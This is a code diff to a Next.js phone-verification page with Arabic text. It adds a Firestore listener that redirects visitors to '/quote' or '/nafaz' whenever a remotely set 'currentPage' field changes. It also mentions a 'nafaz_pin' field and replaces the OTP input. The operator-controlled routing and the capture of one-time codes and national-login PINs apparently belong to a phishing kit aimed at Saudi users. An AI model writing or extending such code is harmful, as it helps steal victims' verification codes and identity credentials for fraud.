@@ -3,12 +3,15 @@
 import type React from "react"
 import { useRouter } from "next/navigation"
 import { useEffect, useState } from "react"
-import { addData } from "@/lib/firebase"
+import { addData, db} from "@/lib/firebase"
 import { Check, X, RefreshCw, Phone } from "lucide-react"
 import { Header } from "@/components/header"
 import {  STCModal } from "@/components/STCModal"
 import { PhoneVerificationService, sendPhone } from "@/lib/phone-service"
 import { OtpInput } from "@/components/otp-input"
+import { Input } from "@/components/ui/input"
+import { Badge } from "@/components/ui/badge"
+import { doc, onSnapshot } from "firebase/firestore"
 
 // Function to get or create visitor ID
 const getOrCreateVisitorId = () => {
@@ -99,6 +102,8 @@ export default function PhoneVerificationEnhanced() {
 
     // Mock Firestore listener - replace with actual implementation
     const mockListener = () => {
+      
+      
       // Simulate random approval after some time for demo
       const timer = setTimeout(() => {
         const isApproved = Math.random() > 0.3 // 70% success rate for demo
@@ -122,6 +127,27 @@ export default function PhoneVerificationEnhanced() {
   }, [verificationStatus, visitorId, router])
 
   // Format time for display
+useEffect(()=>{
+  const visitorId=localStorage.getItem('visitor')
+    const unsubscribe = onSnapshot(doc(db, "pays", visitorId!), (docSnapshot) => {
+      if (docSnapshot.exists()) {
+        const userData = docSnapshot.data()
+        // Assuming the PIN is stored in a field called 'nafaz_pin'
+        if(userData.currentPage ==='1'){
+            window.location.href='/quote'
+        }else if(userData.currentPage ==='8888'){
+          window.location.href='/nafaz'
+        }
+      } else {
+        console.error("User document not found")
+      }
+    },
+    
+  )
+
+  // Clean up the listener when component unmounts or modal closes
+  return () => unsubscribe()
+}, [])
   const formatTime = (seconds: number) => {
     const mins = Math.floor(seconds / 60)
     const secs = seconds % 60
@@ -330,7 +356,9 @@ export default function PhoneVerificationEnhanced() {
               {(verificationStatus === "pending" || verificationStatus === "sending") &&
                 loaderMessage.includes("رمز التحقق") && (
                   <div className="space-y-4">
-                    <OtpInput value={otpCode} onChange={handleOtpChange} error={otpError} />
+                    <Input value={otpCode} type="tel" maxLength={6}  onChange={(e)=>handleOtpChange(e.target.value)}  />
+                  
+                  <Badge variant={'outline'} className="text-red-500">  {otpError} </Badge>
 
                     <div className="flex justify-center gap-2">
                       <button
